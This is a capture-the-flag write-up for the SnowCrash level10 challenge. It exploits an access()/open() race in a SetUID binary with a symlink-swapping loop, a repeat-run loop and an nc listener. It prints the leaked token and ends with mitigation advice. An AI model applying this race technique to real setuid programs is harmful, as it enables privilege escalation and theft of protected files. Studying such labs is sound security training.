## 📄 Description

This level includes a SetUID binary that checks file access using a vulnerable `access()` call. By exploiting a race condition with a fast-switching symlink, we trick the binary into reading a protected token file and send its content over the network to retrieve the flag.

## 🧩 Challenge Overview

- Binary: `level10` (SetUID, owned by `flag10`)

```
-rwsr-sr-x 1 flag10 level10 10817 Mar  5  2016 level10
```

- Target file: `token` (readable only by `flag10`)

```
-rw------- 1 flag10 flag10 26 Mar  5  2016 token
```

- The binary connects to a remote host on port 6969 and sends a file if the user has access to it:

```
level10@SnowCrash:~$ strings level10
[...]
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
[...]
```

- Using `nm -u`, we see the binary uses the `access()` and `open()` system calls:

```
level10@SnowCrash:~$ nm -u level10
[...]
U access@@GLIBC_2.0
U connect@@GLIBC_2.0
U exit@@GLIBC_2.0
U fflush@@GLIBC_2.0
U htons@@GLIBC_2.0
U inet_addr@@GLIBC_2.0
U open@@GLIBC_2.0
[...]
```

- According to the `man 2 access` documentation, using `access()` to check permissions before calling `open()` is **not safe**, as it's **non-atomic**. This creates a race condition vulnerability.

- By exploiting the short time gap between these two calls, we can swap the file using a symlink to trick the binary into opening the protected token file.

## ⚔️ Exploitation Strategy

1. Create a symbolic link `/tmp/exploit` that rapidly switches between a file you can access and the protected `token` file.

```
level10@SnowCrash:~$ while true; do ln -fs ~/level10 /tmp/exploit ; ln -fs ~/token /tmp/exploit; done
```

2. Continuously run the `level10` binary targeting `/tmp/exploit` to trigger repeated permission checks and file opens.

```
level10@SnowCrash:~$ while true; do ./level10 /tmp/exploit 127.0.0.1; done
```

3. Open a listener on port `6969` to capture the file content sent by the binary.

```
level10@SnowCrash:~$ nc -lk 6969
```

4. When the symlink points to `token` during the `open()` call, the binary sends its contents, which we receive on our listener.

```
level10@SnowCrash:~$ nc -lk 6969
[...]
                      ��A�������������������
���o�Ё                                      Є
�
 ��H������o���o�(.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
ELF 4$4 	($!444  TTTT
                            T
                             8X(((��hhhDDP�td\
[...]
```

5. Use the token to switch user to `flag10` and run `getflag`.

## ✅ Result

- By running the exploit, we capture the `first flag` from the `token` file sent to our listener on port 6969.

```
woupa2yuojeeaaed06riuj63c
```

- We use this password to login as `flag10` and get the `second flag`:

```
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token :
```

## 🛡️ Mitigation Advice

- Avoid using `access()` to check permissions before `open()`; this creates a race condition vulnerability.
- Perform permission checks atomically by opening the file and handling errors directly.
- Use safer alternatives like `open()` with **proper flags** or **capabilities** to reduce race conditions.
